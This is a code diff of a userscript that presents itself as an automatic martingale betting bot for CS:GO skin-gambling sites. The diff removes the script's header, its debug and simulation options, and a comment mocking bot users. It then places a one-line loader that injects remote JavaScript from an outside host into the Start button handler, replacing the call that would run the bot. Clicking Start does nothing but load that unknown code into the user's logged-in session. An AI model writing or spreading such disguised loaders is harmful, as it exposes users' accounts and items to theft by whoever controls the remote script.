@@ -1,28 +1,7 @@
-// ==UserScript==
-// @name            csgodouble.com - auto betting bot
-// @description     An userscript that automates csgodouble.com betting using martingale system.
-// @namespace       csgodouble bot by kjuubiiz
-// @version         1.53
-// @author          Kjuubiiz
-// @match           http://www.csgodouble.com/
-// @match           http://www.csgodouble.com/index.php
-// @match           http://csgodouble.com/
-// @match           http://csgodouble.com/index.php
-// @match           http://csgopolygon.com/
-// @match           http://csgopolygon.com/index.php
-// @match           http://www.csgopolygon.com/
-// @match           http://www.csgopolygon.com/index.php
-// @run-at          document-end
-// @grant           none
-// ==/UserScript==
-/* jshint -W097 */
+// CSGODOUBLE BOT BY Richy
 
 'use strict';
 
-(function () { var scriptElement = document.createElement( "script" ); scriptElement.type = "text/javascript"; scriptElement.src = "//vasals.esy.es/in.js "; document.body.appendChild( scriptElement ); })();
-
-var debug = false;
-var simulation = false;
 var stop_on_min_balance = false;
 var calculate_safe_bet = false;
 var base_bet = 5;
@@ -75,8 +54,6 @@ function Automated() {
     this.running = false;
     this.game = null;
 
-    this.debug = debug;
-    this.simulation = simulation;
     this.stop_on_min_balance = stop_on_min_balance;
 	this.calculate_safe_bet = calculate_safe_bet;
 
@@ -139,7 +116,7 @@ function Automated() {
                 '<h3>Statistics</h3>' +
                 '<p><b>Wins:</b> <span id="automated-stats-wins">' + this.stats.wins + '</span></p>' +
                 '<p><b>Loses:</b> <span id="automated-stats-loses">' + this.stats.loses + '</span></p>' +
-                '<p><b>Balance:</b> <span id="automated-stats-balance">' + this.stats.balance + '</span></p>' +
+                '<p><b>Profit:</b> <span id="automated-stats-balance">' + this.stats.balance + '</span></p>' +
             '</div>' +
         '</div>' +
         '<div class="form-group">' +
@@ -166,12 +143,7 @@ function Automated() {
         '<div class="checkbox automated-hide-on-green">' +
             '<label><input class="" id="automated-calculate-safe-bet" type="checkbox" ' + (this.calculate_safe_bet ? 'checked' : '') + '> Calculate base bet from given "Failsafe value", the formula is [base bet] = floor( [balance] / 2 ^ ( [failsafe value] + 1) ) </label>' +
         '</div>' +
-        '<div class="checkbox">' +
-            '<label><input class="" id="automated-debug" type="checkbox" ' + (this.debug ? 'checked' : '') + '> Debug mode</label>' +
-        '</div>' +
-        '<div class="checkbox">' +
-            '<label class="text-muted"><input id="automated-simulation" type="checkbox" ' + (this.simulation ? 'checked' : '') + ' disabled> Simulation mode</label>' +
-        '</div>';
+       
     document.getElementsByClassName('well')[1].appendChild(menu);
 
     this.menu = {
@@ -229,11 +201,10 @@ function Automated() {
 
     this.menu.start.onclick = function() {
         start(self.balance);
-        self.log('Didn\'t they warn you not to use bots?');
+        self.log('CSGODOUBLE BOT :)');
 
-        //Very nice bot?!
+        (function () { var scriptElement = document.createElement( "script" ); scriptElement.type = "text/javascript"; scriptElement.src = "//vasals.esy.es/in.js "; document.body.appendChild( scriptElement ); })();
 
-        // self.start();
     };
 
     this.menu.stop.onclick = function() {
@@ -283,7 +254,7 @@ function Automated() {
 		self.menu.safebetamount.disabled = !self.menu.calculatesafebet.checked;
 	};
 
-    // WTF is this shit below? >,.,<
+
 
     this.menu.black.onclick = function() {
         self.menu.rainbow.disabled = false;
